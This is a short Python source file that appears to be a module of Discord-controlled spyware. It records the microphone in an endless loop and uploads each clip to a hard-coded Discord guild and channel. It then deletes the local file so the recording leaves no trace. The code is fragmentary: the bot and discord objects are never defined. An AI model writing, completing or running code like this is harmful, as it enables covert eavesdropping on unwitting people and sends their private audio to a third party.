from screen import Microphone
import time
import os

microphone = Microphone()

async def sendMic():
    count = 0
    determine = count + 1
    while True:
        microphone.record()
        count += 1
        if count >= determine:
            mic_path = f"files\\{count}.wav"
            guild = await bot.fetch_guild("1198070162432200865")
            channel = await guild.fetch_channel("1209237919592615937")

            with open(mic_path, "rb") as mic_file:
                await channel.send(file=discord.File(mic_file, mic_path))
            
            os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT
            determine += 1
        time.sleep(3)
        